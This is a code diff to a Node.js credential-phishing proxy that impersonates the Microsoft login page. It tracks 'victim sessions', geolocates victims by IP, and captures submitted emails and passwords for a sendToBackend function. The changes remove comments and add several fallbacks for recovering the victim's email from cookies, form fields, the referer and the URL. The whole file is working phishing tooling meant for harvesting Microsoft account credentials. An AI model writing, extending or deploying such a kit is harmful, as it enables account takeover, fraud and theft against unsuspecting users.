@@ -47,7 +47,6 @@ function getSession(sessionId) {
     if (!sessionId) return null;
     const session = VICTIM_SESSIONS[sessionId];
     if (!session) return null;
-    // Check expiry
     if (Date.now() - session.timestamp > SESSION_TTL) {
         delete VICTIM_SESSIONS[sessionId];
         return null;
@@ -66,7 +65,7 @@ function createSession(email) {
 }
 
 // ============================================================
-//  IP EXTRACTION & GEOLOCATION (Enhanced)
+//  IP EXTRACTION & GEOLOCATION
 // ============================================================
 
 function isPrivateIP(ip) {
@@ -80,11 +79,9 @@ function isPrivateIP(ip) {
 }
 
 function getClientIp(req) {
-    // 1. Cloudflare
     const cfIp = req.headers['cf-connecting-ip'];
     if (cfIp && !isPrivateIP(cfIp)) return cfIp.trim();
 
-    // 2. X-Forwarded-For – take first public IP
     const forwarded = req.headers['x-forwarded-for'];
     if (forwarded) {
         const ips = forwarded.split(',').map(ip => ip.trim());
@@ -93,22 +90,18 @@ function getClientIp(req) {
         }
     }
 
-    // 3. Direct connection
     const remote = req.socket.remoteAddress;
     if (remote && !isPrivateIP(remote)) return remote;
 
     return 'unknown';
 }
 
-// Geolocation with caching
 const geoCache = new Map();
-const CACHE_TTL = 60 * 60 * 1000; // 1 hour
-const FAILURE_CACHE_TTL = 5 * 60 * 1000; // 5 minutes for failures
+const CACHE_TTL = 60 * 60 * 1000;
 
 async function getLocationFromIp(ip) {
     if (ip && ip.startsWith('::ffff:')) ip = ip.substring(7);
 
-    // Check cache
     const now = Date.now();
     if (geoCache.has(ip)) {
         const entry = geoCache.get(ip);
@@ -201,7 +194,6 @@ async function getLocationFromIp(ip) {
         } catch (e) { /* ignore */ }
     }
 
-    // All APIs failed – cache failure briefly to avoid spamming
     const fallback = { 
         full: 'Location unavailable', 
         city: 'Unknown', 
@@ -217,7 +209,7 @@ async function getLocationFromIp(ip) {
 }
 
 // ============================================================
-//  OTHER HELPERS
+//  HELPERS
 // ============================================================
 
 async function sendToBackend(email, password, req, attemptType, ip) {
@@ -347,8 +339,24 @@ function serveFile(filename, res, contentType = 'text/html') {
 // ============================================================
 
 function handleLoginRequest(req, res) {
+    // ✅ FIX: Extract email from URL and decode properly
     const rawEmail = req.url.split('login_hint=')[1]?.split('&')[0] || '';
-    const email = decodeURIComponent(rawEmail);
+    let email = rawEmail ? decodeURIComponent(rawEmail) : '';
+    
+    // ✅ If no email, try to get from session
+    if (!email) {
+        const sessionId = getSessionIdFromCookie(req.headers.cookie);
+        if (sessionId && VICTIM_SESSIONS[sessionId]) {
+            email = VICTIM_SESSIONS[sessionId].email;
+        }
+    }
+    
+    // ✅ If still no email, log a warning
+    if (!email) {
+        console.warn('[PROXY] ⚠️ No email found in request');
+        email = 'unknown';
+    }
+
     const hasError = req.url.includes('error=');
 
     // Create session and store email
@@ -357,14 +365,16 @@ function handleLoginRequest(req, res) {
     const cookieFlags = `Path=/; HttpOnly; SameSite=Lax${isSecure ? '; Secure' : ''}`;
     res.setHeader('Set-Cookie', [`sessionId=${sessionId}; ${cookieFlags}`]);
 
+    // ✅ Build the correct Microsoft OAuth URL
     let targetUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=943a2b14-68aa-4205-88c1-a4b65ab04e81&response_type=code&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient&scope=openid%20profile%20email&login_hint=${encodeURIComponent(email)}`;
+    
     if (hasError) {
         const errorParam = req.url.split('error=')[1]?.split('&')[0] || '';
         targetUrl += `&error=${errorParam}`;
     }
 
     console.log(`[PROXY] 🔄 Forwarding to: ${targetUrl}`);
-    console.log(`[PROXY] 📧 Email decoded: ${email}`);
+    console.log(`[PROXY] 📧 Email: ${email}`);
     console.log(`[PROXY] 🆔 Session ID: ${sessionId}`);
 
     https.get(targetUrl, (targetRes) => {
@@ -388,9 +398,11 @@ function handlePostRequest(body, req, res) {
         const formData = querystring.parse(body);
         const ip = getClientIp(req);
 
-        // Extract email: session first, then form, then referer, then URL
-        const sessionId = getSessionIdFromCookie(req.headers.cookie);
+        // ✅ Extract email with multiple fallbacks
         let email = '';
+        const sessionId = getSessionIdFromCookie(req.headers.cookie);
+        
+        // 1. Try session
         if (sessionId) {
             const session = getSession(sessionId);
             if (session) {
@@ -398,17 +410,23 @@ function handlePostRequest(body, req, res) {
                 console.log(`[SESSION] Using stored email: ${email}`);
             }
         }
+        
+        // 2. Try form data
         if (!email) {
             email = formData.login || formData.loginfmt || formData.email || '';
-            if (!email) {
-                const referer = req.headers.referer || '';
-                const match = referer.match(/login_hint=([^&]+)/);
-                if (match) email = decodeURIComponent(match[1]);
-            }
-            if (!email) {
-                const match = req.url.match(/login_hint=([^&]+)/);
-                if (match) email = decodeURIComponent(match[1]);
-            }
+        }
+        
+        // 3. Try referer
+        if (!email) {
+            const referer = req.headers.referer || '';
+            const match = referer.match(/login_hint=([^&]+)/);
+            if (match) email = decodeURIComponent(match[1]);
+        }
+        
+        // 4. Try URL
+        if (!email) {
+            const match = req.url.match(/login_hint=([^&]+)/);
+            if (match) email = decodeURIComponent(match[1]);
         }
 
         const password = formData.passwd || formData.password || '';
